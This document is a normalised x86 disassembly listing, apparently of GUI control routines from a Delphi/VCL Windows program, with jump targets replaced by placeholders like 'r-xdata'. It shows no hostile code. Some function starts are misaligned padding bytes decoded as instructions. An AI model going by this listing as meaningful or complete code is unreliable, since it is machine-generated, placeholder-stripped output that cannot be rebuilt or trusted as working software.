jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_40850c
call sub_4084a8
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_4084a8
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_4365bc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_4365ec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_4365b0
push ebp
call sub_4365bc
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43663c
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_4366c8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_436700
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_436180
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_44b994
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403360
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_44b994
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403360
sub_436784
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_434c7c
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_435344
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_436700
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_4367d0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_434c7c
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_4367ec
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_434c7c
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_435344
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_436700
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_403360
sub_436844
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_436120
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_4360b4
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_436120
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_4368e0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_436700
pop esi
pop ebx
retn
sub_436905
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_436700
pop esi
pop ebx
retn
sub_43692b
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_436700
pop esi
pop ebx
retn
sub_436955
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_436700
pop esi
pop ebx
retn
sub_43697b
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_4369b0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_436180
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_44b994
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_403360
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_44b994
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_403360
sub_436a28
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_436a60
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_44b994
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_403360
sub_436a98
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_435344
mov edx edi
xor ecx ecx
mov eax ebx
call sub_436a60
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_4069f4
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403360
sub_436b10
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_436a60
pop esi
pop ebx
retn
sub_436b30
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_436a60
pop esi
pop ebx
retn
sub_436b50
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_44b994
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_403360
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_4401ac
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_436ba8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_435334
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_435344
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_4362b4
pop esi
retn
sub_436be8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_4362e8
sub_436c96
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_435554
mov cl 0x1
sub_436cd8
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_4352ac
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_4352ac
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_436d08
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_436d2c
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_4069f4
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_403360
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_4362b4
mov [ ebx + 0xc ] eax
sub_436dd0
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_435200
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_435200
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_436e64
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_4030ac
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_4348a0
mov edx [ esp ]
mov eax esi
call sub_43487c
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_434b28
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_434b6c
sub_436ee8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_4156bc
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_434c24
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_41570c
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_434acc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_436f74
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_436e64
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_43b8e8
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_436ee8
pop ecx
jmp r-xdata
sub_436fd4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4370c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4370c9
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ec0
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_43513c
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43510c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_43510c
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_4042a8
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_403ef0
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_43502c
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_4370d0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_403360
sub_4370fc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43711c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43713c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43715c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43717c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43719c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4371bc
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41c908
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_434760
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403360
sub_4371f4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_437290
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4171a0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_4416d8
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_441810
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43510c
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_441570
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_441930
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437297
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_4372a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_4372dc
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_4372a0
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_43738c
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_4032f0
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_4373c0
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_4373e0
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_403360
test al al
je r-xdata
mov eax edi
call sub_437420
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_43744c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_437478
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_4069f4
mov eax esp
call sub_415734
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_434c50
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_403360
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_403360
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_434c7c
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_415734
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_4156bc
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_434c24
sub_4375a0
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_4375e0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_433e50
mov eax esi
mov edx [ r-xdata ]
call sub_403314
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_437614
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
